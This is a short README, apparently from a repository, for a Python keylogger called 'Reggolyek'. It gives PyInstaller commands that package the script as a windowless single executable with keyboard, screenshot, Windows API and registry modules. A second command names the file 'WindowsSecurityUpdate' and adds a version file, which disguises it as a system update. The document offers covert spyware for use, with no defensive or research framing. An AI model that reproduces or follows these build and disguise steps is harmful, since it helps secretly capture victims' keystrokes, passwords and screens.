# Reggolyek

Python keylogger
# How to make file .exe

* pip install pyinstaller
* cd keylogger
* pyinstaller --onefile --noconsole --add-data ".env;." --hidden-import keyboard --hidden-import pygetwindow --hidden-import PIL --hidden-import win32gui --hidden-import win32con --hidden-import win32api --hidden-import dotenv --hidden-import winreg --name "Reggolyek" keylogger.py
pyinstaller --onefile --noconsole --add-data ".env;." --hidden-import keyboard --hidden-import pygetwindow --hidden-import PIL --hidden-import win32gui --hidden-import win32con --hidden-import win32api --hidden-import dotenv --hidden-import winreg --name "WindowsSecurityUpdate" --version-file version.txt keylogger.py